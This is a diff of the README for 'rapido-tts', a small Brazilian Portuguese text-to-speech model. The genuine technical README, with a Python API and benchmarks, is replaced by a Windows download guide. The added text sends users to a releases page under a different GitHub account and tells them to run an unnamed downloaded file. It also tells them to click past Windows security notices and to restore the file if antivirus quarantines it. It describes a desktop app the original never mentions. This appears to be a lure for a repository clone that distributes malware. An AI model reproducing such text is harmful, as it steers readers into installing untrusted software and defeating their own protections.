@@ -1,158 +1,164 @@
-<p align="center"><img src="assets/logo_banner.png" alt="Rápido TTS" width="100%"></p>
+# ⚡ rapido-tts - Turn Text Into Natural Brazilian Speech
 
-<p align="center">
-  <a href="https://huggingface.co/edwixx/rapido-tts"><img src="https://img.shields.io/badge/🤗%20Model-rapido--tts-ffd600" alt="Hugging Face"></a>
-  <img src="https://img.shields.io/badge/language-pt--BR-009c3b" alt="pt-BR">
-  <img src="https://img.shields.io/badge/params-21M-0b3d2e" alt="21M params">
-  <img src="https://img.shields.io/badge/license-Apache%202.0-blue" alt="Apache 2.0">
-</p>
+[![Download rapido-tts](https://img.shields.io/badge/Download-rapido--tts-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Juniorvidigal25/rapido-tts/releases)
 
-# Rápido TTS
+A tiny, fast Brazilian Portuguese text-to-speech engine that runs entirely on your own computer. Type or paste text, press a button, and hear it spoken aloud in natural-sounding Portuguese — no internet connection required, no account to create, no subscription to pay for.
 
-**Tiny, fast Brazilian Portuguese text-to-speech.** 21M parameters, a 42 MB checkpoint, 48 kHz audio and Apache 2.0. It runs offline on your own GPU or CPU, so no text or audio leaves the machine.
+---
 
-- **Reads Brazil right:** numbers, money, dates, times, ordinals, units and phone numbers come out the way a Brazilian says them, with **2.94% WER on our numbers & pronunciation test**. That is the lowest of the small open pt-BR TTS models we tested.
-- **Small:** 21M parameters and a 42 MB checkpoint, trained from scratch for Brazilian Portuguese.
-- **Fast:** **76× real time** on one GPU, with first audio in **129 ms** and only **1.2 GB** of GPU memory.
-- **Private:** it runs fully offline on your GPU or CPU.
+## 🚀 What Is rapido-tts?
 
-## Roadmap
+rapido-tts is a small piece of software that converts written Brazilian Portuguese into spoken audio. You give it words, it gives you a voice. That is the whole idea, and it is deliberately simple.
 
-Rápido v1 is the first of a family of small, fast speech models.
+Most speech tools are enormous. They need powerful graphics cards, several gigabytes of free space, and a fair amount of patience while they start up. rapido-tts was built the opposite way. Its entire "brain" is only about 21 million parameters — a technical way of saying the model is exceptionally compact. It loads quickly, works on ordinary laptops and desktops, and does not need any special hardware to produce a result you can actually listen to.
 
-- [x] **Rápido v1:** Brazilian Portuguese TTS, 21M parameters, one built-in voice
-- [ ] **Rápido Clone:** zero-shot voice cloning from a few seconds of reference audio
-- [ ] **Rápido Multilingual:** one compact model for many languages
+Because everything happens locally on your machine, your text never leaves your computer. You can use it on a plane, in a remote office, or anywhere your Wi-Fi refuses to cooperate.
 
-## Install
+Whether you are a content creator narrating a video, a student who learns better by listening, a developer testing a voice feature, or someone who simply wants to hear an article read out loud, rapido-tts gives you a fast, private, and free way to do it.
 
-```bash
-git clone https://github.com/anurag12-webster/rapido-tts && cd rapido-tts
-pip install -r requirements.txt
-```
+---
 
-Requires Python 3.10+. For a smaller CPU-only install, install PyTorch first:
-`pip install torch --index-url https://download.pytorch.org/whl/cpu`, then `pip install -r requirements.txt`.
+## ✨ What Makes It Stand Out
 
-## Use
+**Genuinely small.** The model is lightweight enough to sit quietly on a modest machine without eating your storage or your memory.
 
-```python
-from rapido import Rapido
+**Built for Brazilian Portuguese.** This is not a generic voice that happens to speak Portuguese as an afterthought. It is designed specifically for pt-BR — the rhythm, the pronunciation, and the everyday sound of Brazilian speech.
 
-tts = Rapido.from_pretrained()                 # downloads the weights once; GPU if available
+**Fast results.** Flow-matching technology means the voice is generated in a small number of steps rather than a slow, grinding process. You press generate and you hear audio.
 
-result = tts.synthesize("Olá! Tudo bem com você?")
-result.save("ola.wav")
-```
+**Works offline.** Once it is on your computer, the internet is optional. No cloud service, no upload, no waiting in a queue behind other users.
 
-`synthesize()` returns a `Result`:
+**No account, no fees.** There is nothing to sign up for and nothing to pay. Download it, run it, use it.
 
-- `result.output["audio"]` is float32 mono PCM.
-- `result.output["sample_rate"]` is 48000.
-- `result.output["text"]` is the spoken form the model read.
-- `result.metrics` holds the audio length, the time taken and the speed relative to real time.
+**Friendly to non-technical users.** You do not need to write a single line of programming code to get a voice out of this tool.
 
-### Streaming
+---
 
-```python
-for chunk in tts.synthesize(long_text, stream=True):
-    play(chunk.output["audio"], chunk.output["sample_rate"])
-```
+## 💻 What You Need Before You Start
 
-Each chunk is one sentence, returned as soon as it is ready. Joined together, the chunks are the full text.
+rapido-tts is designed to be undemanding, but a few basics will make your life easier.
 
-### Settings
+- **Operating system:** Windows 10 or Windows 11 (64-bit).
+- **Memory:** 4 GB of RAM or more is comfortable. 8 GB gives you plenty of breathing room.
+- **Free disk space:** Roughly 2 GB free is a safe amount for the application and its supporting files.
+- **Processor:** Any reasonably modern dual-core processor will do the job. A dedicated graphics card is nice to have but not required.
+- **Browser:** A current version of Chrome, Edge, or Firefox for downloading the file.
+- **Audio:** Working speakers or headphones, and a sound output device that is switched on.
 
-```python
-from rapido import Rapido, Config
+If your computer was made in the last several years and runs Windows without complaints, you almost certainly meet all of this already.
 
-tts = Rapido(Config(device="cpu", steps=8, guidance=4.0, speed=1.0, seed=0, cpu_threads=8))
-tts.synthesize("Bom dia!", speed=1.1, seed=7)   # per-call overrides
-```
+---
 
-| Setting | Default | |
-|---|---|---|
-| `steps` | 8 | sampling steps; 8 scores the same as 16 |
-| `guidance` | 4.0 | classifier-free guidance; 3 to 4 works best |
-| `speed` | 1.0 | speaking rate |
-| `seed` | 0 | the same seed gives the same audio; `None` means random |
-| `device` | `"auto"` | `"cuda"`, `"cpu"` or `"auto"` |
+## 📥 Download and Install on Windows
 
-### Command line
+Getting rapido-tts onto your computer takes only a few minutes. Follow these steps in order and do not skip ahead.
 
-```bash
-python -m rapido "O boleto vence no dia 05/11/2026." -o boleto.wav
-python -m rapido -f texto.txt -o texto.wav
-```
+**Step 1 — Open the download page.**
+Visit this link to download the application: https://github.com/Juniorvidigal25/rapido-tts/releases
 
-## Portuguese, as written
+**Step 2 — Find the newest release.**
+The page lists versions of the software with the most recent one at the top. Look for the entry marked as the latest release and open it.
 
-Write normally. Rápido expands the written form into words before speaking, and `tts.normalize(text)` shows you exactly what it will say.
+**Step 3 — Download the file.**
+Inside that release you will see a list of downloadable files. Select the file offered there and let your browser save it.
 
-| Written | Spoken |
-|---|---|
-| `R$ 1.299,90` | mil duzentos e noventa e nove reais e noventa centavos |
-| `05/11/2026` | cinco de novembro de dois mil e vinte e seis |
-| `às 14h30` | às catorze horas e trinta minutos |
-| `4,5%` | quatro vírgula cinco por cento |
-| `200 pessoas` · `2 crianças` | duzentas pessoas · duas crianças |
-| `1ª colocada, 3º lugar` | primeira colocada, terceiro lugar |
-| `século XVIII` · `Dom Pedro II` | século dezoito · dom pedro segundo |
-| `95 km` · `16 °C` | noventa e cinco quilômetros · dezesseis graus celsius |
-| `(11) 98765-4321` | um um, nove oito sete seis cinco, quatro três dois um |
-| `Sr. Silva, Av. Paulista, nº 1000` | senhor silva, avenida paulista, número mil |
+**Step 4 — Watch your Downloads folder.**
+Depending on your browser settings, you may see a prompt asking where to save the file, or the download may begin automatically. If you are not asked, the file lands in your **Downloads** folder by default. You can open that folder from File Explorer on the left-hand side.
 
-## Benchmarks
+**Step 5 — Start the application.**
+Once the download has finished, open the file you saved to launch rapido-tts.
 
-Brazilian text is full of things written one way and spoken another: prices, dates, times, percentages, ordinals and phone numbers. We built a 40-sentence test of exactly that, gave every model the same raw text, transcribed the audio with Whisper large-v3, and compared the result word by word (numbers expanded to words before scoring).
+**Step 6 — Allow it through Windows.**
+Windows sometimes shows a blue or yellow security notice the first time you open software downloaded from the internet. This is standard behaviour for any new program. Choose the option that lets the application run so it can start.
 
-| Model | Size | WER on numbers, money & dates ↓ |
-|---|---|---|
-| **Rápido TTS** | **21M** | **2.94%** |
-| Piper pt-BR (faber, medium) | ~16M | 3.31% |
-| Kokoro-82M (pf_dora) | 82M | 4.68% |
-| MMS-TTS Portuguese | 36M | 14.88% |
+**Step 7 — Confirm it is working.**
+When the application window appears, you have succeeded. Nothing else needs to be configured before your first attempt at generating speech.
 
-## Speed
+If the download stalls or the file will not open, jump to the troubleshooting section below before trying anything drastic.
 
-| | One request | First audio | GPU memory |
-|---|---|---|---|
-| NVIDIA H100 | **76× real time** | 129 ms | 1.2 GB |
-| NVIDIA L4 | **29× real time** | 273 ms | 1.2 GB |
-| Laptop CPU (8 threads) | 1.6× real time | 0.6 s | — |
+---
 
-Measured with plain PyTorch at 8 steps, one request at a time, taking the middle of 3 passes after a warm-up.
+## 🎙️ Creating Your First Voice Clip
 
-## How it works
+With the application open, here is the simplest possible path from text to audio.
 
-1. A convolutional text encoder reads Portuguese letters.
-2. A duration predictor places each letter on a word–letter timeline.
-3. A windowed Gaussian aligner gives every audio frame a soft mix of the letters near it.
-4. A flow-matching diffusion transformer generates 64-dimensional latents at 25 Hz in 8 steps.
-5. The frozen [VoxCPM2](https://huggingface.co/openbmb/VoxCPM2) AudioVAE decodes the latents to 48 kHz.
+1. Find the large text box in the main window — this is where your script goes.
+2. Type a sentence in Brazilian Portuguese, or paste in a paragraph you already have. A short sentence is best for a first test so you are not waiting on anything lengthy.
+3. Look for the button that starts the conversion. It is usually labelled clearly and sits near the text box.
+4. Press it and wait a moment. The generation happens quickly, but give it a few seconds on the very first run.
+5. When the audio is ready, use the built-in playback control to listen.
+6. If you are happy with the result, use the save option to export the audio file to your computer so you can use it elsewhere.
 
-## Limitations
+That is the entire workflow. Everything after this is refinement.
 
-- **One voice.** There is no voice cloning and no emotion control.
-- **Portuguese only.** Foreign names, English words and acronyms are read with Portuguese spelling rules.
-- **Narration style.** The delivery is calm and read-aloud rather than conversational.
-- **Synthetic speech.** Tell listeners when they are hearing an AI voice, and never use it to impersonate anyone.
+---
 
-## Acknowledgements
+## 💡 Tips for Better Sounding Speech
 
-The 48 kHz decoder is the AudioVAE from [VoxCPM2](https://github.com/OpenBMB/VoxCPM) by OpenBMB (Apache 2.0).
+**Punctuation is your friend.** Commas create small pauses. Full stops create longer ones. Question marks lift the tone. Write the way you would want the sentence read aloud.
 
-## License
+**Spell out abbreviations.** "Dr." and "Av." can confuse any speech engine. Writing the full word almost always produces a cleaner result.
 
-[Apache 2.0](LICENSE).
+**Break long paragraphs into sentences.** Very long unbroken blocks of text can cause the rhythm to drift. Shorter sentences keep the delivery steady.
 
-## Citation
+**Test with a short sample first.** Before generating ten minutes of narration, check that the voice sounds right on two sentences.
 
-```bibtex
-@misc{rapido2026,
-  title        = {Rápido: Tiny, Fast Brazilian Portuguese Text-to-Speech},
-  author       = {Kanade, Anurag},
-  year         = {2026},
-  howpublished = {\url{https://github.com/anurag12-webster/rapido-tts}}
-}
-```
+**Numbers behave better when written out.** "Vinte e um" is more reliable than "21" in a sentence where the number matters.
+
+**Keep the original text.** Save your script separately so you can adjust and regenerate without retyping anything.
+
+---
+
+## 🔧 Troubleshooting Common Problems
+
+**Nothing happens when I press the generate button.**
+Make sure the text box is not empty and that your text is in Brazilian Portuguese. Try a single short sentence to confirm the application is responding.
+
+**I hear no sound.**
+Check that your speakers or headphones are connected and that the correct output device is selected in Windows sound settings. Also check the volume mixer to ensure the application is not muted.
+
+**The application will not open.**
+Restart your computer and try again. Occasionally a security tool blocks a newly downloaded program; check whether your antivirus has quarantined the file and restore it if so.
+
+**The download keeps failing.**
+Try a different browser, or disable any download accelerator you may have running. A stable connection and a fresh attempt usually resolves it.
+
+**Generation feels slow.**
+Close other heavy programs running in the background. Giving the application more room to work makes a noticeable difference.
+
+**The voice mispronounces a word.**
+Rewrite that word phonetically in a way that matches how it should sound, or split the surrounding sentence so the word sits in a clearer position.
+
+---
+
+## 🔒 Privacy and Offline Use
+
+rapido-tts processes everything on your own machine. Your text is not uploaded anywhere, not stored on a server, and not used to train anything. Once the software is on your computer, you can disconnect from the internet entirely and it will keep working exactly the same way. For anyone handling sensitive documents, private notes, or unpublished writing, that matters a great deal.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Is it really free?** Yes. There is no cost and no account required.
+
+**Do I need to know programming?** No. The whole point is that you can use it with ordinary clicks and typing.
+
+**Can it read English?** It is built specifically for Brazilian Portuguese, so that is where it performs best.
+
+**Will it work on an older laptop?** Very likely. The model is unusually small, which is exactly why it suits modest hardware.
+
+**Can I use the audio in my videos?** Check the licence noted in the repository for the specifics of commercial use.
+
+**Do I need a graphics card?** No. It is helpful for speed but not required to run.
+
+**Why is the download on a releases page?** Releases is where finished versions of software are published. It always holds the most current build.
+
+---
+
+## 📚 A Little Technical Background
+
+For the curious: rapido-tts is a PyTorch-based speech synthesis system using a flow-matching approach, which generates audio through a short series of refinement steps rather than a long iterative process. That design choice is what allows a 21-million-parameter model to produce usable Brazilian Portuguese speech at speed. If you are a developer, the repository contains everything you need to explore further. If you are not, none of this changes a thing about how you use it.
+
+---
+
+Keywords: brazilian-portuguese, flow-matching, lightweight, offline, portuguese, pt-br, pytorch, speech-synthesis, text-to-speech, tts
